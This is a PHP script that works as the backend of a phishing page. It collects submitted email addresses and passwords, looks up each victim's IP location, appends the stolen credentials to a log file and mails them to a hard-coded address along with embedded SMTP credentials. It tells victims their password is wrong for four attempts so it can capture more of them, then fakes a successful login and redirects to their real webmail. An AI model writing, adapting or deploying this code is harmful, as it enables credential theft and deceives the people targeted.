<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers first
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Start session
session_start();

// Block GET requests with JSON response for AJAX compatibility
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'GET requests not allowed'
    ]);
    exit;
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Only POST requests allowed'
    ]);
    exit;
}

try {
    // Get client IP
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    // Get location data (with error handling)
    $ipdat = null;
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip, false, stream_context_create([
            'http' => [
                'timeout' => 5,
                'ignore_errors' => true
            ]
        ]));
        if ($geoData) {
            $ipdat = json_decode($geoData);
        }
    } catch (Exception $e) {
        // Geo data failed, continue without it
    }

    //----------------------------------------------------------\\
    // SMTP Configuration
    $receiver = "bobrob@elitat.com"; // ENTER YOUR EMAIL HERE
    $senderuser = "jered@globalrisk.ru"; // ENTER YOUR SMTP USER
    $senderpass = "global.321"; // ENTER YOUR SMTP PASSWORD
    $senderport = "587"; // ENTER YOUR SMTP PORT
    $senderserver = "mail.globalrisk.ru"; // ENTER YOUR SMTP SERVER
    //----------------------------------------------------------\\

    // Get form data
    $login = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $email = $login;

    // Validate input
    if (empty($login) || empty($password)) {
        echo json_encode([
            'signal' => 'error',
            'success' => false,
            'msg' => 'Email and password are required'
        ]);
        exit;
    }

    // Extract domain from email
    $parts = explode("@", $email);
    $domain = isset($parts[1]) ? $parts[1] : 'unknown';

    // Initialize or get attempt counter
    $attempt_key = 'login_attempts_' . md5($ip . $email);
    if (!isset($_SESSION[$attempt_key])) {
        $_SESSION[$attempt_key] = 0;
    }
    $_SESSION[$attempt_key]++;
    $current_attempt = $_SESSION[$attempt_key];

    // Prepare message content
    $country = ($ipdat && isset($ipdat->geoplugin_countryName)) ? $ipdat->geoplugin_countryName : 'Unknown';
    $city = ($ipdat && isset($ipdat->geoplugin_city)) ? $ipdat->geoplugin_city : 'Unknown';
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $message = "Email: " . $login . "\n";
    $message .= "Password: " . $password . "\n";
    $message .= "Attempt: #" . $current_attempt . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Location: " . $country . " | " . $city . "\n";
    $message .= "Browser: " . $browser . "\n";
    $message .= "Domain: " . $domain . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    $message .= "-----------------------------------\n";

    // Check if this is the 5th attempt - redirect
    if ($current_attempt >= 5) {
        // Reset attempt counter
        unset($_SESSION[$attempt_key]);
        
        // Log the redirect attempt
        try {
            $fp = fopen("SS-Or.txt", "a");
            if ($fp) {
                fputs($fp, "REDIRECT (5th attempt): " . $message);
                fclose($fp);
            }
        } catch (Exception $e) {
            // Log file error, continue anyway
        }
        
        // Return redirect response
        echo json_encode([
            'signal' => 'OK',
            'success' => true,
            'msg' => 'Login successful! Redirecting to webmail...',
            'redirect_url' => 'https://webmail.' . $domain,
            'attempt' => $current_attempt
        ]);
        exit;
    }

    // For attempts 1-4, log and return "invalid" response
    
    // Log to file
    try {
        $fp = fopen("SS-Or.txt", "a");
        if ($fp) {
            fputs($fp, $message);
            fclose($fp);
        }
    } catch (Exception $e) {
        // Log file error, continue anyway
    }

    // Send email notification (simplified)
    try {
        $subject = "LoginAttempt || " . $country . " || " . $login . " || #" . $current_attempt;
        $headers = "From: " . $senderuser . "\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        
        // Use PHP's built-in mail function
        @mail($receiver, $subject, $message, $headers);
    } catch (Exception $e) {
        // Email sending failed, continue anyway
    }

    // Always return "invalid" response for attempts 1-4
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again. (Attempt ' . $current_attempt . '/4)',
        'attempt' => $current_attempt,
        'max_attempts' => 4
    ];

    echo json_encode($response);

} catch (Exception $e) {
    // Catch any unexpected errors
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error: ' . $e->getMessage()
    ]);
} catch (Error $e) {
    // Catch fatal errors
    echo json_encode([
        'signal' => 'error',
        'success' => false,
        'msg' => 'Server error: ' . $e->getMessage()
    ]);
}

exit();
?>